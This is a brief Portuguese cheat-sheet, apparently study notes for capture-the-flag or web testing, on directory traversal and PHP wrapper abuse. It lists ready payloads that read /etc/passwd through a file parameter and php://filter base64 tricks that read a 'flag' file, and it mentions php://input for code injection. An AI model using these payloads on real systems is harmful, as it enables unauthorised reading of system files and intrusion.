### Directory Traversal padrão
Sequências como ../ (ponto-ponto-barra)
- http://exemplo.com/pagina.php?arquivo=../../../../etc/passwd






### Em ambientes PHP vulneráveis, podemos usar wrappers
Como php://filter para ler o conteúdo de arquivos (geralmente codificado, para contornar a execução) ou php://input para injetar código.
- php://filter/convert.base64-encode/resource=dog/../flag
- http://exemplo.com/pagina.php?arquivo=php://filter/read=convert.base64-encode/resource=/etc/passwd
